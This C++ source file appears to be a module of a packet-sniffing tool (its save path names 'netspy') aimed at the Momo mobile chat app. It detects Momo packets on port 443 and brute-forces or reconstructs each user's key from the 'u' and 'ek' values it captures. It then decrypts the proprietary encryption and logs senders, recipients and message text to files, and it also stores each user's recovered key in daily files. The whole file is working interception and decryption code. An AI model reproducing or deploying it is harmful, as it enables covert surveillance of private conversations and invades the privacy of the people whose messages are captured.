// mobilemomo.cpp: implementation of the mobilemomo class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "mobilemomo.h"
#include "..\\src\\http\\VoipUrl.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


wchar_t* U8ToUnicode(char *szU8)
{
    //UTF8 to Unicode
    //预转换，得到所需空间的大小
    int wcsLen = ::MultiByteToWideChar(CP_UTF8, NULL, szU8, strlen(szU8), NULL, 0);
    //分配空间要给'\0'留个空间，MultiByteToWideChar不会给'\0'空间
    wchar_t* wszString = new wchar_t[wcsLen + 1];
    //转换
    ::MultiByteToWideChar(CP_UTF8, NULL, szU8, strlen(szU8), wszString, wcsLen);
    //最后加上'\0'
    wszString[wcsLen] = '\0';

	
	return wszString;
}



int getMyKey(long momoid, int cb, int v)
{
	long v1 = momoid * cb + (v * v);
	int key = 13;
	long v2 = v1 % key;
	if (v2 > 7)
        v2 = v2 % 7;	
	if (v2 == 0)
		v2 = 7;
	return v2;
}

void reverseBytes(byte * a1, int a2)
{
	int v1 = a2 >> 1;
	if (v1)
	{
		int v2 = a2 - 1;
		byte *v3 = a1 + v2;
		int v4 = 0;
		do
		{
			byte a = *v3;
			byte b = *(a1 + v4);
			
			*v3 = b;
			*(a1 + v4) = a;
			v4++;
			v3--;
		} while(v4 != v1);
	}
}



char getEnChar(byte s, int k) 
{
	char c = s << (8 - k) | s >> k;
	if (c != 3)
	{
		return c;
	}
	else 
	{
		return (3 << (8 - k)) | (3 >> k);
    }
}




void L1Decrypt(byte* src, int cb, long momoid, byte* des)
{
	if (des == NULL || src == NULL || cb  == 0)
	{
		return;
	}
	
	byte *v1 = (byte *)malloc(cb);
	for (int i = 0; i < cb; i++)
	{
		int k = getMyKey(momoid, cb, i);		// 0 - 7
		char c = src[i] << (8 - k) | src[i] >> k;
		if (c != 3)
            v1[i] = c;
        else 
		{
            v1[i] = (3 << (8 - k)) | (3 >> k);
        }
	}
	reverseBytes(v1, cb);
	memcpy(des, v1, cb);
	free(v1);
}


long GetMomoID(byte * src, int cb, byte * des) 
{
	long momoid = 0;
	int tmp = 0;
	do 
	{
		tmp = getMyKey(momoid, cb, 0);
		if (getEnChar(src[0], tmp) != '}')
			continue;
		tmp = getMyKey(momoid, cb, 1);
		if (getEnChar(src[1], tmp) != '\"' && (getEnChar(src[1], tmp)  < 0x30 || getEnChar(src[1], tmp)  > 0x39) )
			continue;
		tmp = getMyKey(momoid, cb, cb-2);
		if (getEnChar(src[cb - 2], tmp) != '\"')
			continue;
		tmp = getMyKey(momoid, cb, cb-1);
		if (getEnChar(src[cb - 1], tmp) != '{')
			continue;
		L1Decrypt(src, cb, momoid, des);
		//wprintf(L"%d : %s \n", momoid, U8ToUnicode((char *)des));
		return momoid;
	} while (++momoid < 0x10000);
	return 0;
}

BOOL ProcessMomoPacket(const char * pPacket, DATEHEADER & packh, HttpProtocol * HttpPro)
{
	unsigned char * dst = new unsigned char[packh.m_datalen];
	memset(dst,0,packh.m_datalen);
	long MomoID = GetMomoID((byte*)pPacket + 2, packh.m_datalen - 4, dst);
	if (MomoID)
	{
		L1Decrypt((byte*)pPacket + 2, packh.m_datalen - 4, MomoID, dst);
		StringManipulation ms;
		string data = ms.UTF8ToGBK(string((char *)dst));
		delete [] dst;
		if ( (data.find("\"text\"") != string::npos) && (data.find("\"to\"") != string::npos) )
		{
			ms.Replace(data,"{","");
			ms.Replace(data,"}","");
			ms.Replace(data,"\"","");
			ms.SplitStringToMap(data,',',':');
			string to = ms.GetValueFromMapByKey("to");
			string msg = ms.GetValueFromMapByKey("text");
			
			CString txt;
			txt.Format("to=%s\r\nmsg=%s\r\nplatform=mobile\r\n",to.c_str(),msg.c_str());
			HttpSession tmpsession(packh, g_httpFrom);
			tmpsession.m_dceprocotol=HttpPro;
			
			tmpsession.WriteMobileMomoFile(txt);
		}
	}

	


//	free(dst);
	return TRUE;
}

BOOL IsMomoPacket(const char * pPacket, DATEHEADER & packh)
{
	if (packh.m_sport == 443 || packh.m_dport == 443)
	{
		if (pPacket[0] == 1 && pPacket[1] == 2)
		{
			if (pPacket[packh.m_datalen - 2] == 3 && pPacket[packh.m_datalen - 1] == 4)
			{
				return TRUE;
			}
		}
	}
	return FALSE;
}





//void WriteMomoIndexFile(string From, string To, string )
//{

//}




BOOL Momo_DealPacket(const char* pPacket, DATEHEADER& packh,HttpProtocol* httpprotocl)
{
	CString keyvalue;
	int u = 0, ek = 0;

	CString clientip,serverip,clientVcode;
	clientip.Format("%03u_%03u_%03u_%03u_%d", packh.m_sip[0],packh.m_sip[1], packh.m_sip[2], packh.m_sip[3],packh.m_sport);
	serverip.Format("%03u_%03u_%03u_%03u_%d", packh.m_dip[0],packh.m_dip[1], packh.m_dip[2], packh.m_dip[3],packh.m_dport);

	if(v_MomoMap.Lookup(clientip,clientVcode) || v_MomoMap.Lookup(serverip,clientVcode))
	{
		//将数据进行分解
		//数据格式 密钥|ek|u|更新时间

		CStringArray itemArray;
		Splitstr(clientVcode,itemArray,'|');

		//////////////////////////////////////////////////////////////////////////
		//这个地方有问题，待解决
		if(itemArray.GetSize()==4)
		{
			int eku;
			eku = atoi(itemArray[0]);

			if (memcmp(pPacket+2,"\x76",1)!=0 && eku!=0)
			{
				CString msgcontent;
				byte * buf2 = (byte *)malloc(packh.m_datalen);
				memset(buf2, 0, packh.m_datalen);
				Momo_L1Decrypt((unsigned char *)pPacket + 2, packh.m_datalen - 4, eku, buf2);
				if (!strstr((char *)buf2, "\"po\"") && !strstr((char *)buf2, "\"pi\""))
				{
					int user;
					user = atoi(itemArray[2]);

					
					msgcontent.Format("%s",buf2);

					if(msgcontent.Find("\"_\":\"msg\"")!=-1)
					{
						MOMOSTRUCT momost;
						Momo_SplitMsg(msgcontent,momost);

						if(momost.to!="" && momost.msg!="")
						{
							if(momost.from == ""){
								momost.from.Format("%d",user);
							}

							CString txt;
							txt.Format("user=%d\r\nfrom=%s\r\nto=%s\r\nmsg=%s\r\nplatform=mobile\r\n",user,momost.from,momost.to,momost.msg);
							
							HttpSession tmpsession(packh, g_httpFrom);
							tmpsession.m_dceprocotol=httpprotocl;
							
							tmpsession.WriteMobileMomoFile(txt);
						}
					}
				}
				free(buf2);

				return TRUE;
			}
			else
			{
				//从第二个包中获取到随机数
				char *p = strstr((char *)pPacket + 2, "\"ek\":");
				if (p)
				{
					ek = atoi(p + 6);

					CStringArray itemArray;
					Splitstr(clientVcode,itemArray,'|');

					if(itemArray.GetSize()==4 && itemArray[1]=="0")
					{
						SYSTEMTIME st;
						GetLocalTime(&st);
						CString tm;
						tm.Format("%04u-%02u-%02u %02u:%02u:%02u",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);

						int tmpu,eku;
						tmpu = atoi(itemArray[2]);
						eku = ek % tmpu;

						keyvalue.Format("%d|%d|%d|%s",eku,ek,tmpu,tm);
						v_MomoMap.SetAt(serverip,keyvalue);


						Momo_passwordSave(tmpu,eku);
					}

					return TRUE;
				}
			}
		}
		else
		{
			return FALSE;
		}
	}else{
		
		//从第一个包中获取到账号
		char *p = strstr((char *)pPacket + 2, "\"u\":");
		if (p)
		{
			u = atoi(p + 5);

			keyvalue.Format("0|0|%d|0",u);
			v_MomoMap.SetAt(clientip,keyvalue);

			return TRUE;
		}

		return FALSE;
	}

	return TRUE;
}


CString Momo_U8ToUnicode(char *szU8)
{
    //UTF8 to Unicode
    //预转换，得到所需空间的大小
    int wcsLen = ::MultiByteToWideChar(CP_UTF8, NULL, szU8, strlen(szU8), NULL, 0);
    //分配空间要给'\0'留个空间，MultiByteToWideChar不会给'\0'空间
    wchar_t* wszString = new wchar_t[wcsLen + 1];
    //转换
    ::MultiByteToWideChar(CP_UTF8, NULL, szU8, strlen(szU8), wszString, wcsLen);
    //最后加上'\0'
    wszString[wcsLen] = '\0';

	CString retstr;
	WideCharToMultiByte(CP_ACP,0,wszString,wcsLen,retstr.GetBuffer(0),wcsLen/2,NULL,NULL);

	return retstr;
}

int Momo_getMyKey(long momoid, int cb, int v)
{
	long v1 = momoid * cb + (v * v);
	int key = 13;
	long v2 = v1 % key;
	if (v2 > 7)
        v2 = v2 % 7;	
	if (v2 == 0)
		v2 = 7;
	return v2;
}

void Momo_reverseBytes(byte* a1, int a2)
{
	int v1 = a2 >> 1;
	if (v1)
	{
		int v2 = a2 - 1;
		byte *v3 = a1 + v2;
		int v4 = 0;
		do
		{
			byte a = *v3;
			byte b = *(a1 + v4);
			
			*v3 = b;
			*(a1 + v4) = a;
			v4++;
			v3--;
		} while(v4 != v1);
	}
}







void Momo_L1Decrypt(byte* src, int cb, long momoid, byte* des)
{
	if (des == NULL || src == NULL || cb  == 0)
		return;
	
	byte *v1 = (byte *)malloc(cb);
	for (int i = 0; i < cb; i++)
	{
		int k = Momo_getMyKey(momoid, cb, i);  // 0 - 7
		char c = src[i] << (8 - k) | src[i] >> k;
		if (c != 3)
            v1[i] = c;
        else {
            v1[i] = (3 << (8 - k)) | (3 >> k);
        }
	}
	Momo_reverseBytes(v1, cb);
	memcpy(des, v1, cb);
	free(v1);
}

BOOL Momo_passwordSave(int momoNum,int momoKey)
{
	CString passsavepath;
	passsavepath.Format("e:\\netspy\\para\\mobilemomo");

	if(_access(passsavepath,0)!=0)
	{
		mkdir(passsavepath);
	}

	//每天存一个文件
	SYSTEMTIME now;
	GetLocalTime(&now);

	CString SavePath;
	SavePath.Format("%s\\%04d%02d%02d.ini",passsavepath, now.wYear, now.wMonth, now.wDay);
	
	CString content;
	content.Format("%d\1%d\n",momoNum,momoKey);

	CStdioFile cf;
	cf.Open(SavePath,CFile::modeCreate | CFile::modeWrite | CFile::modeNoTruncate);
	cf.SeekToEnd();
	cf.Write(content,content.GetLength());
	cf.Close();

	return TRUE;
}

BOOL Momo_SplitMsg(CString msg,MOMOSTRUCT& momost)
{
	//去除{}及"
	msg = Momo_Utf82GB2312(msg);

	msg.Replace("{","");
	msg.Replace("}","");
	msg.Replace("\"","");

	CStringArray momomsgArray;
	Splitstr(msg,momomsgArray,',');
	if(momomsgArray.GetSize()>0)
	{
		for(int i=0; i<momomsgArray.GetSize(); i++)
		{
			CStringArray ItemArray;
			Splitstr(momomsgArray[i],ItemArray,':');
			if(ItemArray.GetSize()==2)
			{
				if(ItemArray[0]=="fr")
				{
					momost.from = ItemArray[1];
				}
				else if(ItemArray[0]=="to")
				{
					momost.to = ItemArray[1];
				}
				else if(ItemArray[0]=="text")
				{
					momost.msg = ItemArray[1];
				}
			}
		}
	}

	return TRUE;
}

CString Momo_Utf82GB2312(LPCTSTR strMessage)
{
	WCHAR *wcTemp = NULL;
	char *MultiBute = NULL;
	CString strRest="";
	
	try	{
		int  i=  MultiByteToWideChar  (  CP_UTF8  ,  0  , strMessage , -1  , NULL , 0 );
		if( i == 0 )
			return "";
		
		wcTemp  =  new  WCHAR[i+2];  
		memset(wcTemp, 0, (i+2)*2 );
		if(MultiByteToWideChar  (  CP_UTF8  ,  0  ,strMessage,  -1,  wcTemp  ,  (i+2)*2) == 0 )
		{
			delete []wcTemp;  
			return "";
		}
		
		i=  WideCharToMultiByte(CP_ACP, 0, wcTemp, -1, NULL, 0, NULL, NULL); 
		if( i == 0 )
		{
			delete []wcTemp;  
			return "";
		}
		
		MultiBute = new char[i + 100];
		memset(MultiBute, 0, i + 100);
		if(WideCharToMultiByte  (CP_ACP, 0, wcTemp, -1, MultiBute, i, NULL, NULL ) != 0 ) 
			strRest = MultiBute;
		
		delete []MultiBute;
		delete []wcTemp;
		
	}catch(...)	{
		strRest.Empty();
	}
	
	return strRest;
}